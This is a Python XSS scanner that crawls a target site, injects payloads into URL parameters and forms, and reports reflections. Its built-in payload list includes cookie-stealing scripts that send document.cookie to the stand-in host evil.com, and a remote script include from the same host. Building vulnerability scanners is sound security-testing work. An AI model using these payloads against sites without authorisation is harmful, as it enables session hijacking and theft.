import requests
import urllib.parse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import time
import random
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.robotparser import RobotFileParser
import json
from datetime import datetime
import threading
import logging
import os
from typing import List, Dict, Set, Optional, Tuple
import warnings
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)
class XSSScanner:
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or self._default_config()
        self.vulnerabilities = []
        self.scanned_urls = set()
        self.session = requests.Session()
        self.session.verify = self.config['verify_ssl']
        self.session.headers.update({
            'User-Agent': random.choice(self.config['user_agents']),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        })
        self.lock = threading.Lock()
        self._setup_logging()
        self.payloads = self._load_payloads_from_file()
        self.context_modifiers = {
            'html': lambda p: p,
            'js_string': lambda p: p.replace("'", "\\'").replace('"', '\\"'),
            'attribute': lambda p: p.replace('"', '&quot;').replace("'", '&#39;'),
            'css': lambda p: p.replace('{', '\\7B').replace('}', '\\7D'),
        }
    def _load_payloads_from_file(self) -> List[str]:
        payloads = []
        try:
            base_dir = os.path.dirname(__file__)
        except NameError:
            base_dir = os.getcwd()
        payload_file = os.path.join(base_dir, "Payloads", "XSSpy.txt")
        os.makedirs(os.path.dirname(payload_file), exist_ok=True)
        if not os.path.exists(payload_file):
            self.logger.info(f"Payload file {payload_file} not found. Creating a new one.")
            self._create_default_payload_file(payload_file)
        try:
            with open(payload_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        payloads.append(line)
            self.logger.info(f"Loaded {len(payloads)} payloads from {payload_file}")
            if payloads:
                self.logger.debug(f"Raw payloads preview: {payloads[:3]}")
            if not payloads:
                self.logger.warning("No payloads found in file, using default payloads")
                return self._get_default_payloads()
        except Exception as e:
            self.logger.error(f"Error loading payloads from file: {e}")
            return self._get_default_payloads()
        return payloads
    def _create_default_payload_file(self, filename: str):
        default_payloads = [
            "<script>alert('XSS')</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<input onfocus=alert('XSS') autofocus>",
            "<a href='javascript:alert(1)'>Click</a>",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "';alert(1);var x='",
            "\";alert(1);var x=\"",
            "<script>alert('Stored XSS')</script>",
            "<script>document.cookie='xss=true';</script>",
            "<script src='http://evil.com/xss.js'></script>",
            "<img src=x onerror=document.body.innerHTML='<script>alert(1)</script>'>",
            "<script>document.getElementById('test').innerHTML='<img src=x onerror=alert(1)>'</script>",
            "<script>document.write('<script>alert(1)</script>')</script>",
            "<script>eval(location.hash.substr(1))</script>",
            "<script>alert(document.location)</script>",
            "<script>alert(document.cookie)</script>",
            "<script>fetch('https://evil.com/collect',{method:'POST',body:document.cookie})</script>",
            "<script>new Image().src='https://evil.com/collect?cookie='+document.cookie</script>",
            "<script>var xhr=new XMLHttpRequest();xhr.open('POST','https://evil.com/collect');xhr.send(document.cookie)</script>",
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>setTimeout('alert(1)',0)</script>",
            "<style>@import 'javascript:alert(1)';</style>",
            "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
        ]
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                for payload in default_payloads:
                    f.write(payload + '\n')
            self.logger.info(f"Created default payload file: {filename}")
        except Exception as e:
            self.logger.error(f"Error creating payload file: {e}")
    def _get_default_payloads(self) -> List[str]:
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<a href='javascript:alert(1)'>Click</a>",
            "';alert(1);var x='",
            "<script>alert(document.cookie)</script>",
            "<script>fetch('https://evil.com/collect',{method:'POST',body:document.cookie})</script>",
        ]
    def _default_config(self) -> Dict:
        return {
            'max_threads': 10,
            'timeout': 10,
            'delay': 0.1,
            'max_depth': 3,
            'max_urls': 100,
            'verify_ssl': False,
            'follow_redirects': True,
            'respect_robots': True,
            'user_agents': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            ],
            'output_file': f'xss_scan_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json',
        }

    def _setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler(f'xss_scanner_{datetime.now().strftime("%Y%m%d")}.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

        logging.getLogger("urllib3.connectionpool").setLevel(logging.WARNING)

    def print_banner(self):
        banner = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗
║                             SX XSS Scanner V2                                ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
        print(banner)

    def check_robots_txt(self, base_url: str) -> bool:
        if not self.config['respect_robots']:
            return True
        try:
            robots_url = urllib.parse.urljoin(base_url, '/robots.txt')
            rp = RobotFileParser()
            rp.set_url(robots_url)
            rp.read()
            return rp.can_fetch('*', base_url)
        except:
            return True

    def extract_forms(self, url: str) -> List[Dict]:
        try:
            response = self.session.get(url, timeout=self.config['timeout'], verify=self.config['verify_ssl'])
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = []
            
            for form in soup.find_all('form'):
                form_details = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'get').lower(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_details = {
                        'type': input_tag.get('type', 'text'),
                        'name': input_tag.get('name', ''),
                        'value': input_tag.get('value', ''),
                        'required': input_tag.has_attr('required')
                    }
                    if input_details['name']:
                        form_details['inputs'].append(input_details)
                
                if form_details['inputs']:
                    forms.append(form_details)
            
            return forms
        except Exception as e:
            self.logger.error(f"Error extracting forms from {url}: {e}")
            return []

    def extract_parameters(self, url: str) -> Dict[str, str]:
        parsed = urllib.parse.urlparse(url)
        return dict(urllib.parse.parse_qsl(parsed.query))

    def test_payload_in_context(self, url: str, param: str, payload: str, context: str = 'html') -> Optional[Dict]:
        modified_payload = self.context_modifiers.get(context, lambda x: x)(payload)
        
        try:
            if context == 'html':
                parsed = urllib.parse.urlparse(url)
                query_params = self.extract_parameters(url)
                query_params[param] = modified_payload
                new_query = urllib.parse.urlencode(query_params)
                test_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
                
                response = self.session.get(test_url, timeout=self.config['timeout'], verify=self.config['verify_ssl'])
                
                if self._check_payload_reflection(response.text, payload):
                    return {
                        'url': test_url,
                        'param': param,
                        'payload': payload,
                        'context': context,
                        'response_code': response.status_code,
                        'reflection': True
                    }
            
            elif context == 'form':
                forms = self.extract_forms(url)
                for form in forms:
                    form_data = {}
                    for input_field in form['inputs']:
                        if input_field['name'] == param:
                            form_data[input_field['name']] = modified_payload
                        else:
                            form_data[input_field['name']] = input_field['value']
                    
                    action_url = urllib.parse.urljoin(url, form['action'])
                    
                    if form['method'] == 'post':
                        response = self.session.post(action_url, data=form_data, timeout=self.config['timeout'], verify=self.config['verify_ssl'])
                    else:
                        response = self.session.get(action_url, params=form_data, timeout=self.config['timeout'], verify=self.config['verify_ssl'])
                    
                    if self._check_payload_reflection(response.text, payload):
                        return {
                            'url': action_url,
                            'param': param,
                            'payload': payload,
                            'context': context,
                            'form_method': form['method'],
                            'response_code': response.status_code,
                            'reflection': True
                        }
            
        except Exception as e:
            self.logger.error(f"Error testing payload: {e}")
        
        return None

    def _check_payload_reflection(self, response_text: str, payload: str) -> bool:
        if payload.lower() in response_text.lower():
            return True
        
        payload_parts = re.split(r'[<>"\'&]', payload)
        for part in payload_parts:
            if len(part) > 3 and part.lower() in response_text.lower():
                return True
        
        encoded_payloads = [
            urllib.parse.quote(payload),
            urllib.parse.quote_plus(payload),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
            payload.replace('"', '&quot;').replace("'", '&#39;')
        ]
        
        for encoded in encoded_payloads:
            if encoded in response_text:
                return True
        
        return False

    def scan_url(self, url: str) -> List[Dict]:
        if url in self.scanned_urls:
            return []
        
        self.scanned_urls.add(url)
        vulnerabilities = []
        
        print(f"{Fore.YELLOW}[~] Scanning: {url}")
        
        params = self.extract_parameters(url)
        for param in params:
            for payload in self.payloads:
                for context in ['html', 'form']:
                    result = self.test_payload_in_context(url, param, payload, context)
                    if result:
                        vulnerabilities.append(result)
                        print(f"{Fore.RED}[!] XSS Found: {result}")
        
        forms = self.extract_forms(url)
        for form in forms:
            for input_field in form['inputs']:
                if input_field['name']:
                    for payload in self.payloads:
                        result = self.test_payload_in_context(url, input_field['name'], payload, 'form')
                        if result:
                            vulnerabilities.append(result)
                            print(f"{Fore.RED}[!] XSS Found in Form: {result}")
        
        return vulnerabilities

    def crawl_website(self, base_url: str, max_depth: int = 3) -> Set[str]:
        urls_to_scan = {base_url}
        crawled_urls = set()
        depth = 0
        
        while urls_to_scan and depth < max_depth and len(crawled_urls) < self.config['max_urls']:
            current_urls = urls_to_scan.copy()
            urls_to_scan.clear()
            
            for url in current_urls:
                if url in crawled_urls:
                    continue
                
                crawled_urls.add(url)
                
                try:
                    response = self.session.get(url, timeout=self.config['timeout'], verify=self.config['verify_ssl'])
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.text, 'html.parser')
                        links = set()
                        
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            full_url = urllib.parse.urljoin(url, href)
                            
                            if urllib.parse.urlparse(full_url).netloc == urllib.parse.urlparse(base_url).netloc:
                                links.add(full_url)
                        
                        urls_to_scan.update(links)
                        
                except Exception as e:
                    self.logger.error(f"Error crawling {url}: {e}")
            
            depth += 1
            time.sleep(self.config['delay'])
        
        return crawled_urls

    def generate_report(self):
        report = {
            'scan_date': datetime.now().isoformat(),
            'total_urls_scanned': len(self.scanned_urls),
            'vulnerabilities_found': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(self.config['output_file'], 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                              SCAN REPORT                                    ║")
        print(f"{Fore.CYAN}╠══════════════════════════════════════════════════════════════════════════════╣")
        print(f"{Fore.CYAN}║ Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<54} ║")
        print(f"{Fore.CYAN}║ URLs Scanned: {len(self.scanned_urls):<53} ║")
        print(f"{Fore.CYAN}║ Vulnerabilities Found: {len(self.vulnerabilities):<47} ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝")
        
        if self.vulnerabilities:
            print(f"\n{Fore.RED}[!] VULNERABILITIES DETECTED:")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{Fore.YELLOW}[{i}] {vuln.get('context', 'Unknown').upper()} XSS")
                print(f" URL: {vuln.get('url', 'N/A')}")
                print(f" Parameter: {vuln.get('param', 'N/A')}")
                print(f" Payload: {vuln.get('payload', 'N/A')}")
                if 'form_method' in vuln:
                    print(f" Form Method: {vuln['form_method'].upper()}")
                print(f" Response Code: {vuln.get('response_code', 'N/A')}")
        else:
            print(f"\n{Fore.GREEN}[+] No XSS vulnerabilities detected")
        
        print(f"\n{Fore.CYAN}[+] Report saved to: {self.config['output_file']}")

    def validate_url(self, url: str) -> bool:
        try:
            result = urllib.parse.urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    def run(self):
        self.print_banner()
        
        base_url = input(f"{Fore.CYAN}\nEnter the base URL (example https://example.com | https or http required): ").strip()
        
        if not self.validate_url(base_url):
            print(f"{Fore.RED}[!] Invalid URL format")
            input(f"{Fore.MAGENTA}\n↩ Press Enter to return to main menu...")
            return
        
        if not base_url.startswith(('http://', 'https://')):
            base_url = 'https://' + base_url
        
        print(f"{Fore.YELLOW}\n[~] Starting XSS Scan...\n")
        
        try:
            if not self.check_robots_txt(base_url):
                print(f"{Fore.RED}[!] Scanning disallowed by robots.txt")
                input(f"{Fore.MAGENTA}\n↩ Press Enter to return to main menu...")
                return
            
            print(f"{Fore.CYAN}[*] Crawling website...")
            urls_to_scan = self.crawl_website(base_url, self.config['max_depth'])
            print(f"{Fore.GREEN}[+] Found {len(urls_to_scan)} URLs to scan")
            
            if not urls_to_scan:
                print(f"{Fore.YELLOW}[!] No URLs found to scan")
                input(f"{Fore.MAGENTA}\n↩ Press Enter to return to main menu...")
                return
            
            print(f"{Fore.CYAN}[*] Starting XSS vulnerability scan...")
            
            with ThreadPoolExecutor(max_workers=self.config['max_threads']) as executor:
                futures = {executor.submit(self.scan_url, url): url for url in urls_to_scan}
                
                for future in as_completed(futures):
                    url = futures[future]
                    try:
                        vulnerabilities = future.result()
                        with self.lock:
                            self.vulnerabilities.extend(vulnerabilities)
                    except Exception as e:
                        self.logger.error(f"Error scanning {url}: {e}")
            
            self.generate_report()
            
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Scan interrupted by user")
        except Exception as e:
            print(f"\n{Fore.RED}[!] Scan failed: {e}")
            self.logger.error(f"Scan failed: {e}")
        
        input(f"{Fore.MAGENTA}\n↩ Press Enter to return to main menu...")

def main():
    try:
        scanner = XSSScanner()
        scanner.run()
    except Exception as e:
        print(f"{Fore.RED}[!] Scanner initialization failed: {e}")

if __name__ == "__main__":
    main()